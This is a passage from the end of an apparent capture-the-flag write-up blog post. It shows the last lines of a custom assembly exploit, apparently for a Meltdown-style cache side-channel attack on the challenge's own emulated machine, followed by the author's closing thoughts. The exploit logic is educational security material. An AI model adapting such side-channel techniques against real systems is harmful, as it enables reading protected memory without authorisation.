</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bgt</span> <span style="color:#ae81ff">0x7c</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r4</span>, <span style="color:#66d9ef">r7</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r2</span>, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">r2</span>, <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ble</span> <span style="color:#ae81ff">0x50</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; Store result
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">str</span> <span style="color:#66d9ef">r1</span>, <span style="color:#66d9ef">r11</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r11</span>, <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r10</span>, <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">; check to see if we should finish
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">r9</span>, <span style="color:#66d9ef">r10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bge</span> <span style="color:#ae81ff">0x0c</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">halt</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">.handler</span> <span style="color:#66d9ef">DATA_ABORT</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">b</span> <span style="color:#ae81ff">0x20</span>
</span></span></code></pre></div><h2 id="final-thoughts">Final Thoughts</h2>
<p>I enjoyed making this challenge, and felt like I learned a lot while doing it.  Hopefully if you played it you enjoyed it too.</p>

  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://stolenfootball.github.io/posts/research/2025/signal_windows_decryption/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HowTo - Decryption of Signal Messages on Windows</a>
        
	    
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#the-challenge">The Challenge</a></li>
    <li><a href="#the-leg">The LEG</a></li>
    <li><a href="#the-vulnerability">The Vulnerability</a></li>
    <li><a href="#running-the-exploit">Running the Exploit</a>
      <ul>
        <li><a href="#step-1-access-kernel-memory">Step 1: Access kernel memory</a></li>
        <li><a href="#step-2-store-the-data-before-the-exception-handler-finishes">Step 2: Store the data before the exception handler finishes</a></li>
        <li><a href="#step-3-handle-the-exception">Step 3: Handle the exception</a></li>
        <li><a href="#step-4-retrieve-the-value-from-the-cache">Step 4: Retrieve the value from the cache</a></li>
      </ul>
    </li>
    <li><a href="#final-solution">Final solution</a></li>
    <li><a href="#final-thoughts">Final Thoughts</a></li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
